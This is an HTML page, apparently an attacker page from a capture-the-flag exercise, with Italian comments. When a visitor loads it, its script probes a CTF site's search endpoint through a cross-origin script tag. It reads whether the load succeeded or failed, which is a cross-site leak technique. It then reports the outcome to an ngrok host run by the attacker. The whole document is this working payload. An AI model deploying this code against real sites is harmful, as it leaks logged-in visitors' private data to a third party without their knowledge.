<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>

    <script>
        function probeError(url) {
            let script = document.createElement('script');
            script.src = url;
            script.onload = () => {
                console.log('Onload event triggered');
                // Notify your server that the flag is accessible
                fetch('https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=accessibile', {
                    method: 'GET'
                })
                .then(response => console.log("Risultato inviato:", response))
                .catch(error => console.error('Errore invio risultato:', error));
            };
            script.onerror = () => {
                console.log('Error event triggered');
                // Notify your server that the flag is not accessible
                fetch('https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=non_accessibile', {
                    method: 'GET'
                })
                .then(response => console.log("Risultato inviato:", response))
                .catch(error => console.error('Errore invio risultato:', error));
            };
            document.head.appendChild(script);
        }

        // Prova a caricare il flag
        probeError('https://matrix.capturetheflags.site/search?s=flag'); // Sostituisci con il tuo endpoint
    </script>
</body>
</html>
